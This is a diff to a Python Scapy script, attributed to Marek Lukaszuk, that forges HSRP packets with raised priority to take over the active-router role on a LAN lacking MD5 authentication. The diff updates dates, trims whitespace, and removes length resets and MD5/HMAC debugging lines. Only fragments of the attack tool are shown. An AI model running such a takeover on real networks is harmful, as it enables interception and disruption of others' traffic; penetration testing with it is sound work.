@@ -1,11 +1,11 @@
 #!/usr/bin/env python
 
-# $Id: 20121212$
-# $Date: 2012-12-12 12:50:37$
+# $Id: 20121215$
+# $Date: 2012-12-15 17:22:16$
 # $Author: Marek Lukaszuk$
 
-# This takes over any HSRPv0/1 and v2 
-# communication in LAN that 
+# This takes over any HSRPv0/1 and v2
+# communication in LAN that
 # is _not_ protected by MD5 auth
 
 # http://www.networksorcery.com/enp/protocol/hsrp.htm
@@ -74,15 +74,12 @@ p[Ether].src = EthSrc
 # set some values to None to
 # recalculate them automatically
 if p.haslayer(IP):
-  p[IP].len = None
   p[IP].chksum = None
   p[IP].src = IPv4Src
 elif p.haslayer(IPv6): # TODO - test IPv6
-  p[IPv6].len = None
   p[IPv6].chksum = None
   p[IPv6].src = IPv6Src
 
-p[UDP].len = None
 p[UDP].chksum = None
 
 # lets increase priority
@@ -102,17 +99,10 @@ if str(p[HSRP])[2] == hsrpv2 and str(p[HSRP])[4] == hsrpv2active:
 
     if data[off] == "\x04":
       print "[-] auth HSRP using MD5, stopping"
-      print org.encode('hex')
-      print org[:-16].encode('hex') 
-      print org[-16:].encode('hex')
-      d1 = org[:-16]+"\x00"*16
-      print hashlib.md5(org[:-16]+"\x00"*12+"pass").hexdigest()
-      print d1.encode('hex')
-      print HMAC.new("pass",d1).hexdigest()
       sys.exit(1)
 
     off += ord(data[off+1]) + 2
- 
+
   # print data.encode('hex')
   p[UDP].payload = data.decode('string_escape')
 else:
